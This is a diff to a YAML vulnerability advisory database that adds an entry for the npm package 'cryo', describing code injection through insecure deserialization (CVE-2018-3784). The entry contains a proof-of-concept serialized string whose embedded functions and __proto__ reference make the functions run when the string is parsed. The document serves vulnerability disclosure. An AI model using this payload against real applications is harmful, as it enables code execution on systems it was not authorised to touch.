@@ -1,5 +1,33 @@
 ---
-- id: snykio:npm:cryo:CVE-2018-3784
+- id: npmjs:npm:cryo:690
+  title: Code Injection
+  description: |-
+    All versions of `cryo` are vulnerable to code injection due to an Insecure implementation of deserialization.
+
+
+    ## Proof of concept
+
+    ```
+    var Cryo = require('cryo');
+    var frozen = '{"root":"_CRYO_REF_3","references":[{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\"); return 1111;}"},{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\");return 2222;}"},{"contents":{"toString":"_CRYO_REF_0","valueOf":"_CRYO_REF_1"},"value":"_CRYO_OBJECT_"},{"contents":{"__proto__":"_CRYO_REF_2"},"value":"_CRYO_OBJECT_"}]}'
+    var hydrated = Cryo.parse(frozen);
+    console.log(hydrated);
+    ```
+  affected_package: cryo
+  vulnerable_versions:
+  - "<=99.999.99999"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2018-3784
+  cwe: CWE-502
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Alexey Tyurin
+  references: https://npmjs.com/advisories/690
+  source_url: https://npmjs.com/advisories/690
+- id: snykio:npm:cryo:20180619
   title: Arbitrary Code Execution
   description: |
     [`cryo`][1] is a json parser.
